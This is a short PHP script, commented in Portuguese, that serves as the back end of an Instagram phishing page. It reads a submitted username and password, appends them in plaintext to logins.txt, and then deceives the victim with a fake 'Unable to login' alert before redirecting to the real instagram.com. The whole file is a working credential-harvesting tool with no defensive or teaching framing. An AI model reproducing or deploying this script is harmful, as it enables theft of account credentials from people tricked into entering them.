<?php

// Variáveis de configuração
$username = $_POST['u_name'] ?? '';  // Obter nome de usuário (usando operador de coalescência nula)
$passcode = $_POST['pass'] ?? '';    // Obter senha (usando operador de coalescência nula)

$filename = 'logins.txt'; // Nome do arquivo onde os dados serão salvos

// Verificar campos de entrada
if (!empty($username) and !empty($passcode)) {
    // Dados a serem salvos
    $txt = "Username: " . $username . "\r\nPassword: " . $passcode . "\r\n------------------------\r\n";
    
    // Tentar abrir o arquivo para escrita
    if (file_put_contents($filename, $txt, FILE_APPEND) !== false) {
        echo "<script type='text/javascript'>alert('Error! Unable to login');
            window.location.replace('https://www.instagram.com');
            </script>";
    } else {
        echo "<script type='text/javascript'>alert('Error! Unable to write to file.');
            window.history.go(-1);
            </script>";
    }
} else {
    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again');
        window.history.go(-1);
        </script>";
}
?>
